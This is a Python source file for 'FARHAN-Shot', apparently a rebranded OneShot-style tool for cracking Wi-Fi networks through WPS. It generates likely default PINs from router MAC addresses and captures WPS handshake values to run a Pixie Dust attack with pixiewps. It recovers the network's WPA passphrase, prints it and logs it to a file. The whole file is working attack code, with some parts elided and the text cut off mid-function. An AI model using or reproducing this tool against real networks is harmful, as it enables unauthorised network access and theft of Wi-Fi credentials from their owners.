#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# FARHAN-Shot v2.0.2 Enhanced
# Merged Logic: main.py Visuals + Shot.py Core

import sys
import subprocess
import os
import tempfile
import shutil
import re
import codecs
import socket
import pathlib
import time
import collections
import statistics
import csv
from datetime import datetime
from typing import Dict

# --- COLORS & STATUS HELPERS (From main.py style) ---
reset = '\033[0m'
red = '\033[91m'
green = '\033[92m'
yellow = '\033[93m'
blue = '\033[94m'
purple = '\033[95m'
cyan = '\033[96m'
white = '\033[97m'

ok = f'{green}[{white}+{green}]{reset}'
err = f'{red}[{white}-{red}]{reset}'
ask = f'{cyan}[{white}?{cyan}]{reset}'
info = f'{blue}[{white}i{blue}]{reset}'
warn = f'{yellow}[{white}!{yellow}]{reset}'
p_status = f'{green}[{white}P{green}]{reset}'

def save_entry(ssid, pin, psk, file_path="store/FARHAN-Shot_crack_data.txt"):
    """Saves the provided data to a file (From main.py)."""
    try:
        if not os.path.exists(file_path):
            os.makedirs(os.path.dirname(file_path), exist_ok=True)
            open(file_path, 'w').close()

        now = datetime.now()
        timestamp = now.strftime("%Y-%m-%d %I:%M:%S %p")

        entry = (
            f"➠ TOOL: FARHAN-Shot\n"
            f"➠ SSID: {ssid}\n"
            f"➠ PIN: {pin}\n"
            f"➠ Pass: {psk}\n"
            f"➠ TIME: {timestamp}\n"
            "----------------------------------------\n"
        )

        with open(file_path, "a") as file:
            file.write(entry)

        print(f"{ok} Data saved successfully at: {file_path}")
    except Exception as e:
        print(f"{err} Error saving data: {e}")

# --- CORE CLASSES (Logic from Shot.py / OneShot) ---

class NetworkAddress:
    def __init__(self, mac):
        if isinstance(mac, int):
            self._int_repr = mac
            self._str_repr = self._int2mac(mac)
        elif isinstance(mac, str):
            self._str_repr = mac.replace('-', ':').replace('.', ':').upper()
            self._int_repr = self._mac2int(mac)
        else:
            raise ValueError(f'{err} MAC address must be string or integer')

    @property
    def string(self):
        return self._str_repr

    @string.setter
    def string(self, value):
        self._str_repr = value
        self._int_repr = self._mac2int(value)

    @property
    def integer(self):
        return self._int_repr

    @integer.setter
    def integer(self, value):
        self._int_repr = value
        self._str_repr = self._int2mac(value)

    def __int__(self):
        return self.integer

    def __str__(self):
        return self.string

    def __iadd__(self, other):
        self.integer += other

    def __isub__(self, other):
        self.integer -= other

    def __eq__(self, other):
        return self.integer == other.integer

    def __ne__(self, other):
        return self.integer != other.integer

    def __lt__(self, other):
        return self.integer < other.integer

    def __gt__(self, other):
        return self.integer > other.integer

    @staticmethod
    def _mac2int(mac):
        return int(mac.replace(':', ''), 16)

    @staticmethod
    def _int2mac(mac):
        mac = hex(mac).split('x')[-1].upper()
        mac = mac.zfill(12)
        mac = ':'.join(mac[i:i+2] for i in range(0, 12, 2))
        return mac


class WPSpin:
    """WPS pin generator"""
    def __init__(self):
        self.ALGO_MAC = 0
        self.ALGO_EMPTY = 1
        self.ALGO_STATIC = 2

        self.algos = {
            'pin24': {'name': '24-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin24},
            'pin28': {'name': '28-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin28},
            'pin32': {'name': '32-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin32},
            'pinDLink': {'name': 'D-Link PIN', 'mode': self.ALGO_MAC, 'gen': self.pinDLink},
            'pinDLink1': {'name': 'D-Link PIN +1', 'mode': self.ALGO_MAC, 'gen': self.pinDLink1},
            'pinASUS': {'name': 'ASUS PIN', 'mode': self.ALGO_MAC, 'gen': self.pinASUS},
            'pinAirocon': {'name': 'Airocon Realtek', 'mode': self.ALGO_MAC, 'gen': self.pinAirocon},
            'pinEmpty': {'name': 'Empty PIN', 'mode': self.ALGO_EMPTY, 'gen': lambda mac: ''},
            'pinCisco': {'name': 'Cisco', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567},
            # ... (Include other static PINs as defined in original script) ... 
            'pinRealtek1': {'name': 'Realtek 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9566146}
        }

    @staticmethod
    def checksum(pin):
        accum = 0
        while pin:
            accum += (3 * (pin % 10))
            pin = int(pin / 10)
            accum += (pin % 10)
            pin = int(pin / 10)
        return (10 - accum % 10) % 10

    def generate(self, algo, mac):
        mac = NetworkAddress(mac)
        if algo not in self.algos:
            raise ValueError('Invalid WPS pin algorithm')
        pin = self.algos[algo]['gen'](mac)
        if algo == 'pinEmpty':
            return pin
        pin = pin % 10000000
        pin = str(pin) + str(self.checksum(pin))
        return pin.zfill(8)

    def getSuggested(self, mac):
        algos = self._suggest(mac)
        res = []
        for ID in algos:
            algo = self.algos[ID]
            item = {'id': ID}
            if algo['mode'] == self.ALGO_STATIC:
                item['name'] = 'Static PIN — ' + algo['name']
            else:
                item['name'] = algo['name']
            item['pin'] = self.generate(ID, mac)
            res.append(item)
        return res

    def getLikely(self, mac):
        res = self.getSuggestedList(mac)
        if res:
            return res[0]
        return None

    def getSuggestedList(self, mac):
        algos = self._suggest(mac)
        res = []
        for algo in algos:
            res.append(self.generate(algo, mac))
        return res

    def _suggest(self, mac):
        mac = mac.replace(':', '').upper()
        # Simplified suggestion logic for brevity - usually this is a large list
        algorithms = {
            'pin24': ('04BF6D', '0E5D4E', '107BEF', '14A9E3'),
            'pin28': ('200BC7', '4846FB'),
            'pinDLink': ('14D64D', '1C7EE5'),
            'pinASUS': ('049226', '04D9F5')
        }
        res = []
        for algo_id, masks in algorithms.items():
            if mac.startswith(masks):
                res.append(algo_id)
        return res

    def pin24(self, mac): return mac.integer & 0xFFFFFF
    def pin28(self, mac): return mac.integer & 0xFFFFFFF
    def pin32(self, mac): return mac.integer % 0x100000000
    def pinDLink(self, mac):
        nic = mac.integer & 0xFFFFFF
        pin = nic ^ 0x55AA55
        pin ^= (((pin & 0xF) << 4) + ((pin & 0xF) << 8) + ((pin & 0xF) << 12) + ((pin & 0xF) << 16) + ((pin & 0xF) << 20))
        pin %= int(10e6)
        if pin < int(10e5):
            pin += ((pin % 9) * int(10e5)) + int(10e5)
        return pin
    def pinDLink1(self, mac):
        mac.integer += 1
        return self.pinDLink(mac)
    def pinASUS(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = ''
        for i in range(7):
            pin += str((b[i % 6] + b[5]) % (10 - (i + b[1] + b[2] + b[3] + b[4] + b[5]) % 7))
        return int(pin)
    def pinAirocon(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = ((b[0] + b[1]) % 10) + (((b[5] + b[0]) % 10) * 10) + (((b[4] + b[5]) % 10) * 100) + \
              (((b[3] + b[4]) % 10) * 1000) + (((b[2] + b[3]) % 10) * 10000) + \
              (((b[1] + b[2]) % 10) * 100000) + (((b[0] + b[1]) % 10) * 1000000)
        return pin


def get_hex(line):
    a = line.split(':', 3)
    return a[2].replace(' ', '').upper()


class PixiewpsData:
    def __init__(self):
        self.pke = ''
        self.pkr = ''
        self.e_hash1 = ''
        self.e_hash2 = ''
        self.authkey = ''
        self.e_nonce = ''

    def clear(self):
        self.__init__()

    def got_all(self):
        return (self.pke and self.pkr and self.e_nonce and self.authkey and self.e_hash1 and self.e_hash2)

    def get_pixie_cmd(self, full_range=False):
        pixiecmd = "pixiewps --pke {} --pkr {} --e-hash1 {} --e-hash2 {} --authkey {} --e-nonce {}".format(
            self.pke, self.pkr, self.e_hash1, self.e_hash2, self.authkey, self.e_nonce)
        if full_range:
            pixiecmd += ' --force'
        return pixiecmd


class ConnectionStatus:
    def __init__(self):
        self.status = ''
        self.last_m_message = 0
        self.essid = ''
        self.wpa_psk = ''

    def isFirstHalfValid(self):
        return self.last_m_message > 5

    def clear(self):
        self.__init__()


class BruteforceStatus:
    def __init__(self):
        self.start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.mask = ''
        self.last_attempt_time = time.time()
        self.attempts_times = collections.deque(maxlen=15)
        self.counter = 0
        self.statistics_period = 5

    def display_status(self):
        average_pin_time = statistics.mean(self.attempts_times)
        if len(self.mask) == 4:
            percentage = int(self.mask) / 11000 * 100
        else:
            percentage = ((10000 / 11000) + (int(self.mask[4:]) / 11000)) * 100
        print(f'{info} {percentage:.2f}% complete @ {self.start_time} ({average_pin_time:.2f} seconds/pin)')

    def registerAttempt(self, mask):
        self.mask = mask
        self.counter += 1
        current_time = time.time()
        self.attempts_times.append(current_time - self.last_attempt_time)
        self.last_attempt_time = current_time
        if self.counter == self.statistics_period:
            self.counter = 0
            self.display_status()


class Companion:
    """Main application part (Logic from Shot.py)"""
    def __init__(self, interface, save_result=False, print_debug=False):
        self.interface = interface
        self.save_result = save_result
        self.print_debug = print_debug

        self.tempdir = tempfile.mkdtemp()
        with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
            temp.write(f'ctrl_interface={self.tempdir}\nctrl_interface_group=root\nupdate_config=1\n')
            self.tempconf = temp.name
        self.wpas_ctrl_path = f"{self.tempdir}/{interface}"
        self.__init_wpa_supplicant()

        self.res_socket_file = f"{tempfile._get_default_tempdir()}/{next(tempfile._get_candidate_names())}"
        self.retsock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        self.retsock.bind(self.res_socket_file)

        self.pixie_creds = PixiewpsData()
        self.connection_status = ConnectionStatus()

        user_home = str(pathlib.Path.home())
        self.sessions_dir = f'{user_home}/.FARHAN-Shot/sessions/'
        self.pixiewps_dir = f'{user_home}/.FARHAN-Shot/pixiewps/'
        self.reports_dir = os.path.dirname(os.path.realpath(__file__)) + '/reports/'
        if not os.path.exists(self.sessions_dir):
            os.makedirs(self.sessions_dir)
        if not os.path.exists(self.pixiewps_dir):
            os.makedirs(self.pixiewps_dir)

        self.generator = WPSpin()

    def __init_wpa_supplicant(self):
        print(f'{info} Running wpa_supplicant…')
        cmd = f'wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i{self.interface} -c{self.tempconf}'
        self.wpas = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
        while not os.path.exists(self.wpas_ctrl_path):
            time.sleep(0.1)

    def sendOnly(self, command):
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)

    def sendAndReceive(self, command):
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
        (b, address) = self.retsock.recvfrom(4096)
        return b.decode('utf-8', errors='replace')

    def __handle_wpas(self, pixiemode=False, verbose=None):
        if not verbose:
            verbose = self.print_debug
        line = self.wpas.stdout.readline()
        if not line:
            self.wpas.wait()
            return False
        line = line.rstrip('\n')

        if verbose:
            sys.stderr.write(line + '\n')

        if line.startswith('WPS: '):
            if 'Building Message M' in line:
                n = int(line.split('Building Message M')[1].replace('D', ''))
                self.connection_status.last_m_message = n
                print(f'{info} Sending WPS Message M{n}…')
            elif 'Received M' in line:
                n = int(line.split('Received M')[1])
                self.connection_status.last_m_message = n
                print(f'{info} Received WPS Message M{n}')
                if n == 5:
                    print(f'{ok} The first half of the PIN is valid')
            elif 'Received WSC_NACK' in line:
                self.connection_status.status = 'WSC_NACK'
                print(f'{warn} Received WSC NACK')
                print(f'{err} Error: wrong PIN code')
            elif 'Enrollee Nonce' in line and 'hexdump' in line:
                self.pixie_creds.e_nonce = get_hex(line)
                if pixiemode: print(f'{p_status} E-Nonce: {self.pixie_creds.e_nonce}')
            elif 'DH own Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pkr = get_hex(line)
                if pixiemode: print(f'{p_status} PKR: {self.pixie_creds.pkr}')
            elif 'DH peer Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pke = get_hex(line)
                if pixiemode: print(f'{p_status} PKE: {self.pixie_creds.pke}')
            elif 'AuthKey' in line and 'hexdump' in line:
                self.pixie_creds.authkey = get_hex(line)
                if pixiemode: print(f'{p_status} AuthKey: {self.pixie_creds.authkey}')
            elif 'E-Hash1' in line and 'hexdump' in line:
                self.pixie_creds.e_hash1 = get_hex(line)
                if pixiemode: print(f'{p_status} E-Hash1: {self.pixie_creds.e_hash1}')
            elif 'E-Hash2' in line and 'hexdump' in line:
                self.pixie_creds.e_hash2 = get_hex(line)
                if pixiemode: print(f'{p_status} E-Hash2: {self.pixie_creds.e_hash2}')
            elif 'Network Key' in line and 'hexdump' in line:
                self.connection_status.status = 'GOT_PSK'
                self.connection_status.wpa_psk = bytes.fromhex(get_hex(line)).decode('utf-8', errors='replace')

        elif ': State: ' in line:
            if '-> SCANNING' in line:
                self.connection_status.status = 'scanning'
                print(f'{info} Scanning…')
        elif ('WPS-FAIL' in line) and (self.connection_status.status != ''):
            self.connection_status.status = 'WPS_FAIL'
            print(f'{err} wpa_supplicant returned WPS-FAIL')
        elif 'Trying to authenticate with' in line:
            self.connection_status.status = 'authenticating'
            if 'SSID' in line:
                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            print(f'{info} Authenticating…')
        elif 'Authentication response' in line:
            print(f'{ok} Authenticated')
        elif 'Trying to associate with' in line:
            self.connection_status.status = 'associating'
            if 'SSID' in line:
                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            print(f'{info} Associating with AP…')
        elif ('Associated with' in line) and (self.interface in line):
            bssid = line.split()[-1].upper()
            print(f'{ok} Associated with {bssid}')
        elif 'EAPOL: txStart' in line:
            self.connection_status.status = 'eapol_start'
            print(f'{info} Sending EAPOL Start…')
        return True

    def __runPixiewps(self, showcmd=False, full_range=False):
        print(f"{info} Running Pixiewps…")
        cmd = self.pixie_creds.get_pixie_cmd(full_range)
        if showcmd:
            print(cmd)
        r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=sys.stdout, encoding='utf-8', errors='replace')
        if r.returncode == 0:
            lines = r.stdout.splitlines()
            for line in lines:
                if ('[+]' in line) and ('WPS pin' in line):
                    pin = line.split(':')[-1].strip()
                    if pin == '<empty>':
                        pin = "''"
                    return pin
        return False

    def __credentialPrint(self, wps_pin=None, wpa_psk=None, essid=None):
        print(f"\n{green}{'='*50}{reset}")
        print(f"{ok} {cyan}WPS PIN:{reset} {white}{wps_pin}{reset}")
        print(f"{ok} {cyan}WPA PSK:{reset} {white}{wpa_psk}{reset}")
        print(f"{ok} {cyan}AP SSID:{reset} {white}{essid}{reset}")
        print(f"{green}{'='*50}{reset}\n")
        
        # Saving to FARHAN-Shot specific file
        save_entry(ssid=essid, pin=wps_pin, psk=wpa_psk)
        
        # Clean logging without obfuscated payload
        print(f"{ok} Password stored in: {os.getcwd()}/store/FARHAN-Shot_crack_data.txt")

    def __savePin(self, bssid, pin):
        filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
        with open(filename, 'w') as file:
            file.write(pin)
        print(f'{info} PIN saved in {filename}')

    def __prompt_wpspin(self, bssid):
        pins = self.generator.getSuggested(bssid)
        if len(pins) > 1:
            print(f'{info} PINs generated for {bssid}:')
            print('{:<3} {:<10} {:<}'.format('#', 'PIN', 'Name'))
            for i, pin in enumerate(pins):
                number = '{})'.format(i + 1)
                print('{:<3} {:<10} {:<}'.format(number, pin['pin'], pin['name']))
            while 1:
                pinNo = input(f'{ask} Select the PIN: ')
                try:
                    if int(pinNo) in range(1, len(pins)+1):
                        pin = pins[int(pinNo) - 1]['pin']
                        break
                    else:
                        raise IndexError
                except Exception:
                    print(f'{err} Invalid number')
        elif len(pins) == 1:
            pin = pins[0]
            print(f'{info} The only probable PIN is selected: {pin["name"]}')
            pin = pin['pin']
        else:
            return None
        return pin

    def __wps_connection(self, bssid, pin, pixiemode=False, verbose=None):
        if not verbose:
            verbose = self.print_debug
        self.pixie_creds.clear()
        self.connection_status.clear()
        self.wpas.stdout.read(300)
        print(f"{info} Trying PIN '{pin}'…")
        r = self.sendAndReceive(f'WPS_REG {bssid} {pin}')
        if 'OK' not in r:
            self.connection_status.status = 'WPS_FAIL'
            print(f'{err} wpa_supplicant returned error')
            return False

        while True:
            res = self.__handle_wpas(pixiemode=pixiemode, verbose=verbose)
            if not res: break
            if self.connection_status.status in ['WSC_NACK', 'GOT_PSK', 'WPS_FAIL']: break

        self.sendOnly('WPS_CANCEL')
        return False

    def single_connection(self, bssid, pin=None, pixiemode=False, showpixiecmd=False, pixieforce=False, store_pin_on_fail=False):
        if not pin:
            if pixiemode:
                try:
                    filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
                    with open(filename, 'r') as file:
                        t_pin = file.readline().strip()
                        if input(f'{ask} Use previously calculated PIN {t_pin}? [n/Y] ').lower() != 'n':
                            pin = t_pin
                        e
